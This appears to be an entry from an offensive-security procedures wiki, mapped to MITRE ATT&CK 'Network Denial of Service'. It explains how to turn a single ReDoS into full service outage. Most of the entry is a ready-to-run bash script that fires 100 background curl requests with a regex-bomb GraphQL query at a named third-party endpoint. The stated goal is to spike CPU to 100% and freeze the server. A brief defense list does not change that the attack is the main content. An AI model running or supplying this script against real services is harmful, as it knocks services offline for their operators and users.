---
tags:
  - dos
  - concurrent
  - amplification
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/bash]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/amplify-concurrent-dos]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:25:53.213Z'
sub_techniques: []
id: f8fd79a1-1e53-41f1-8584-35b4e148ab12
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
---
# Amplify-DoS-with-Concurrent-Requests

## Summary

This procedure uses a bash script to send multiple concurrent regex bomb requests, overwhelming the server and causing full denial of service.

## Description

Looping 100 background curl requests exploits the ReDoS to spike CPU to 100%, freezing the Node.js process and making the service unavailable.

## Requirements

1. Successful single ReDoS exploitation
2. bash environment
3. Sufficient local resources for concurrency

## Defense

Defensive measures and detection strategies:

- Implement concurrency limits and auto-scaling
- Deploy WAF to detect anomalous request patterns
- Monitor CPU spikes correlated with GraphQL traffic

## Objectives

1. Achieve service-level DoS
2. Confirm vulnerability severity
3. Simulate real-world attack impact

## Instructions

### Step 1: Execute Concurrent Script

**Context**: Automate flood of exploitative requests.

**Command** ([[commands/amplify-concurrent-dos]]):
```bash
#!/bin/bash
RED='\033[0;31m'
Y='\033[0;33m'
NC='\033[0m' # No Color
printf "${Y}================================================================\n"
printf "====================${NC} EXECUTING THE PAYLOAD ON ${Y}=======================\n"
printf "${NC}https://wiki.cs.money/graphql ${Y}========\n"
printf "${Y}================================================================${NC}\n"
for i in {1..100}; do curl 'https://wiki.cs.money/graphql' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*' --data-binary $'{"query":"query a { \n search(q: \"[a-zA-Z0-9]+\\\\\\s?)+$\|^(\[a-zA-Z0-9.\'\\\\\\w\\\\\\W\]+\\\\\\s?)+$\\\\\\\", lang: \"en\") {\n  _id\n  weapon_id\n  rarity\n  collection{  _id name }\n  collection_id \n  \n }\n}","variables":null}' --compressed & done
```

> Server will experience downtime; monitor for unresponsiveness.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Network Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/amplify-concurrent-dos]]

## Tools Used

- [[tools/bash]]
- [[tools/curl]]

## Tags

- dos
- concurrent
- amplification
